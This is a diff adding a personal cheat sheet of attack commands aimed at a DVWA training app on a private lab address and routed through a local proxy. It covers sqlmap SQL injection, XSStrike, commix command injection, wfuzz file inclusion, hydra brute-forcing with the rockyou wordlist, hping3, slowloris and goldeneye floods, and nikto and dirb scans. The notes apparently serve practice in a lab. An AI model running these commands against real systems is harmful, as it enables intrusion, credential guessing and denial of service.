@@ -1,0 +1,60 @@
+sql injection
+sqlmap -u "http://192.168.122.170/dvwa/login.php" --data="username=a&password=a" --proxy="http://127.0.0.1:8080"
+sqlmap -u "http://192.168.122.170/dvwa/login.php" --method POST --data="username=test&password=test" --proxy="http://127.0.0.1:8080"
+sqlmap -u "http://192.168.122.170/dvwa/login.php" --data="username=test&password=test" --risk=3 --level=5 --proxy="http://127.0.0.1:8080" --batch
+
+
+
+xss
+
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+python3 xsstrike.py
+
+
+python3 xsstrike.py -u "http://192.168.122.170/dvwa/vulnerable_page.php" --proxy "http://127.0.0.1:8080"
+
+
+CMD
+commix --url="http://192.168.122.170/dvwa/exec.php?id=1" --proxy="http://127.0.0.1:8080"
+
+DIR
+
+wfuzz -u "http://192.168.122.170/dvwa/file_include.php?file=FUZZ" -w /usr/share/wordlists/dirb/common.txt --proxy "http://127.0.0.1:8080"
+
+
+FILE UPLOAD ATTACKS
+
+Menual
+
+brute force
+hydra will detect do this>
+sudo nano /etc/proxychains4.conf
+Add at bottom:>
+http 127.0.0.1 8080
+then run it>
+proxychains hydra -l admin -P /usr/share/wordlists/rockyou.txt \192.168.122.170 \http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
+
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.122.170 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed" -vV -t 4 -I -e ns -f
+
+
+DDOS
+
+proxychains hping3 -S -p 80 --flood 192.168.122.170
+
+proxychains slowloris 192.168.122.170
+
+proxychains python goldeneye.py http://192.168.122.170
+
+
+SCANNER
+
+nikto -h http://192.168.122.170 --proxy http://127.0.0.1:8080
+
+dirb http://192.168.122.170 -p http://127.0.0.1:8080
+
+
+before any attacks do this
+curl -x http://127.0.0.1:8080 http://192.168.122.170
+
